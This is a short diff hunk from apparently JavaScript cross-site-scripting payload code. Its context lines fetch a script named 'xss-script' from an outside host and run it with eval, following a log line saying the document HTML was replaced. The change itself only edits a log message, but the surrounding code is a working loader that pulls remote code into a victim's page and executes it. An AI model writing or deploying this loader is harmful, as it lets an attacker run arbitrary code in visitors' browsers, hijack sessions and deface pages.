@@ -47,7 +47,7 @@ console.log('Document HTML replaced');
 fetch('https://data.estebanmf.space/xss-script')
 .then(t => t.text())
 .then(script => {
-console.log('xss-script.js fetched, evaluating');
+console.log('xss-script fetched, evaluating');
 try {
 eval(script);
 console.log('xss-script.js evaluated');
